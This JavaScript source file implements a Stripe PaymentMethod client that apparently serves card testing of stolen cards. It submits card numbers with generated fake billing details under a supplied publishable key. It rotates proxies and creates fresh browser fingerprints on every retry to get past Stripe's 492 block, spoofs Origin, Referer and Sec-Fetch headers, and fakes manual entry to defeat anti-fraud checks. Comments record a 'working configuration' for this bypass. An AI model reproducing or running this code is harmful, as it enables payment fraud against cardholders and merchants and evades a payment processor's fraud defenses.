import got from 'got';
import { STRIPE_API } from '../../utils/constants.js';
import { fingerprintGenerator } from '../../utils/FingerprintGenerator.js';
import { fakeDataService } from '../../utils/FakeDataService.js';
import { proxyAgentFactory } from '../http/ProxyAgentFactory.js';

/**
 * Stripe Payment Method Client
 * Creates PaymentMethod tokens via Stripe API
 * 
 * KEY DISCOVERY (Dec 2024):
 * - Origin MUST be https://checkout.stripe.com (not js.stripe.com)
 * - Referer MUST be https://checkout.stripe.com/
 * - Fingerprints (guid, muid, sid) are REQUIRED
 * - payment_user_agent must include "checkout" suffix
 * - client_attribution_metadata is NOT required
 * - Token API (/v1/tokens) is BLOCKED, only PaymentMethod API works
 */

// Retryable proxy/network/timeout error patterns
const RETRYABLE_ERRORS = [
    'proxy connection ended before receiving connect response',
    'client network socket disconnected before secure tls connection was established',
    'socket hang up',
    'unknown error',
    'econnreset',
    'etimedout',
    'econnrefused',
    'stream has been aborted',
    'timeout',
    '30000ms exceeded',
    'exceeded',
    'enotfound',
    'network error',
    'request aborted',
    'aborted'
];

export class StripePaymentMethodClient {
    constructor(options = {}) {
        this.endpoint = STRIPE_API.PAYMENT_METHODS;
        this.timeout = 30000;
        this.proxyManager = options.proxyManager || null;
        this.maxRetries = options.maxRetries || 3;
        this.retryDelay = options.retryDelay || 2000;
    }

    /**
     * Calculate retry delay with exponential backoff and jitter
     * @private
     */
    _getRetryDelay(attempt) {
        // Exponential backoff: 2s, 4s, 8s...
        const baseDelay = this.retryDelay * Math.pow(2, attempt - 1);
        // Add jitter: ±500ms to avoid thundering herd
        const jitter = Math.floor(Math.random() * 1000) - 500;
        return Math.min(baseDelay + jitter, 30000); // Cap at 30s
    }

    /**
     * Check if an error is retryable (proxy/network error)
     * @private
     */
    _isRetryableError(error) {
        const message = (error.message || '').toLowerCase();
        const causeMessage = (error.cause?.message || '').toLowerCase();
        const code = (error.code || '').toLowerCase();

        return RETRYABLE_ERRORS.some(pattern =>
            message.includes(pattern) ||
            causeMessage.includes(pattern) ||
            code.includes(pattern)
        );
    }

    /**
     * Sleep for a given duration
     * @private
     */
    _sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async getProxyAgent() {
        if (this.proxyManager && this.proxyManager.isEnabled()) {
            const proxy = await this.proxyManager.getNextProxy();
            if (proxy) {
                return proxyAgentFactory.create(proxy);
            }
        }
        return null;
    }

    generateBillingDetails(countryCode = 'US') {
        return fakeDataService.generateBillingDetails(countryCode);
    }

    /**
     * Create a PaymentMethod from card details
     * 
     * WORKING CONFIGURATION (tested Dec 2024):
     * - Uses checkout.stripe.com origin (bypasses integration surface block)
     * - Includes required fingerprints (guid, muid, sid)
     * - Uses correct payment_user_agent format
     * - Generates FRESH fingerprints on each retry attempt
     * - Gets FRESH proxy on each retry attempt
     * - Uses billingCountry from BIN data for better AVS matching
     */
    async createPaymentMethod(card, pkKey, options = {}) {
        const { proxy, billingCountry = 'US' } = options;
        let lastError = null;

        // Retry loop - generate FRESH fingerprints AND get FRESH proxy on each attempt
        for (let attempt = 1; attempt <= this.maxRetries; attempt++) {
            try {
                // Get FRESH proxy for each attempt (critical for proxy rotation)
                const proxyAgent = await this.getProxyAgent();

                // Generate FRESH fingerprint for each attempt (critical for 492 bypass)
                const fingerprint = fingerprintGenerator.generateFingerprint();
                // Use billing details matching the card's BIN country for better AVS
                const billing = this.generateBillingDetails(billingCountry);
                const stripeIds = fingerprint.stripeIds;

                // Generate unique session IDs for client attribution (matches 2025 success flow)
                const sessionId = `${stripeIds.guid.slice(0, 8)}-${stripeIds.muid.slice(0, 4)}-${stripeIds.sid.slice(0, 4)}-${Date.now().toString(16)}`;
                const elementsSessionConfigId = `${stripeIds.muid.slice(0, 8)}-${stripeIds.sid.slice(0, 4)}-${stripeIds.guid.slice(0, 4)}-${Date.now().toString(16)}`;

                const data = new URLSearchParams({
                    'type': 'card',
                    'card[number]': card.number,
                    'card[cvc]': card.cvc || card.cvv,
                    'card[exp_year]': card.expYear,
                    'card[exp_month]': card.expMonth,
                    'billing_details[address][country]': billing.country,
                    'billing_details[address][state]': billing.state,
                    'billing_details[address][city]': billing.city,
                    'billing_details[address][line1]': billing.line1,
                    'billing_details[address][postal_code]': billing.postalCode,
                    'billing_details[name]': billing.name,
                    'billing_details[email]': billing.email,
                    // Payment user agent (matches 2025 success flow)
                    'payment_user_agent': 'stripe.js/328730e3ee; stripe-js-v3/328730e3ee; payment-element; deferred-intent; hip',
                    'time_on_page': String(fingerprint.timeOnPage),
                    'key': pkKey,
                    // REQUIRED fingerprints - FRESH each attempt
                    'guid': stripeIds.guid,
                    'muid': stripeIds.muid,
                    'sid': stripeIds.sid,
                    // Anti-fraud: simulate manual entry (not autofill)
                    'pasted_fields': 'number',
                    // allow_redisplay for card reuse (matches success flow)
                    'allow_redisplay': 'limited',
                    // Client attribution metadata (matches 2025 success flow)
                    'client_attribution_metadata[client_session_id]': sessionId,
                    'client_attribution_metadata[merchant_integration_source]': 'checkout', // Changed from 'elements' to match success
                    'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                    'client_attribution_metadata[merchant_integration_version]': '2021',
                    'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                    'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                    // NEW 2025: elements_session_config_id
                    'client_attribution_metadata[elements_session_config_id]': elementsSessionConfigId,
                    // NEW 2025: merchant_integration_additional_elements
                    'client_attribution_metadata[merchant_integration_additional_elements][0]': 'currencySelector',
                    'client_attribution_metadata[merchant_integration_additional_elements][1]': 'expressCheckout',
                    'client_attribution_metadata[merchant_integration_additional_elements][2]': 'payment',
                    // Referrer in body (use js.stripe.com for payment-element)
                    'referrer': 'https://js.stripe.com'
                });

                const response = await got.post(this.endpoint, {
                    body: data.toString(),
                    headers: {
                        'Accept': 'application/json',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        // UPDATED: Use js.stripe.com for payment-element flow (matches success flow)
                        'Origin': 'https://js.stripe.com',
                        'Referer': 'https://js.stripe.com/',
                        'User-Agent': fingerprint.userAgent,
                        'Accept-Language': fingerprint.language.acceptLanguage,
                        'Accept-Encoding': 'gzip, deflate, br, zstd',
                        // Sec-Fetch headers for real browser simulation
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-site',
                        'Priority': 'u=4'
                    },
                    timeout: { request: this.timeout },
                    throwHttpErrors: false,
                    ...(proxyAgent && { agent: { https: proxyAgent, http: proxyAgent } })
                });

                let responseData;
                try {
                    responseData = JSON.parse(response.body);
                } catch {
                    return { success: false, error: 'Invalid JSON response' };
                }

                // Handle HTTP 492 - Stripe fingerprint blocking - RETRY
                if (response.statusCode === 492) {
                    if (attempt < this.maxRetries) {

                        await this._sleep(2000);
                        continue;
                    }
                    return {
                        success: false,
                        error: 'Stripe blocked request - fingerprint issue',
                        code: 'origin_blocked',
                        isBlocked: true,
                        httpStatus: 492
                    };
                }

                // Handle HTTP 429 - Rate Limited - RETRY
                if (response.statusCode === 429) {
                    const retryAfter = parseInt(response.headers['retry-after'] || '5', 10) * 1000;
                    if (attempt < this.maxRetries) {

                        await this._sleep(retryAfter);
                        continue;
                    }
                    return {
                        success: false,
                        error: 'Rate limited by Stripe',
                        code: 'rate_limited',
                        isRateLimited: true,
                        httpStatus: 429
                    };
                }

                // Handle Stripe API errors - don't retry
                if (response.statusCode !== 200) {
                    return {
                        success: false,
                        error: responseData.error?.message || 'Unknown Stripe error',
                        code: responseData.error?.code,
                        declineCode: responseData.error?.decline_code
                    };
                }

                if (responseData.id) {

                    return {
                        success: true,
                        pmId: responseData.id,
                        card: {
                            brand: responseData.card?.brand,
                            last4: responseData.card?.last4,
                            country: responseData.card?.country,
                            funding: responseData.card?.funding
                        },
                        attempts: attempt
                    };
                }

                return {
                    success: false,
                    error: responseData.error?.message || 'Unknown Stripe error'
                };
            } catch (error) {
                lastError = error;

                // Check if error is retryable
                const isRetryable = this._isRetryableError(error);

                if (isRetryable && attempt < this.maxRetries) {
                    // Return immediately with needsRetry flag - don't block the worker
                    // The service can requeue this card for retry

                    return {
                        success: false,
                        error: error.message,
                        isNetworkError: true,
                        needsRetry: true,
                        attemptNumber: attempt,
                        maxRetries: this.maxRetries
                    };
                }
            }
        }

        // All retries exhausted

        return {
            success: false,
            error: lastError?.message || 'Network error after retries',
            isNetworkError: true,
            retriesExhausted: true
        };
    }
}

export const stripePaymentMethodClient = new StripePaymentMethodClient();
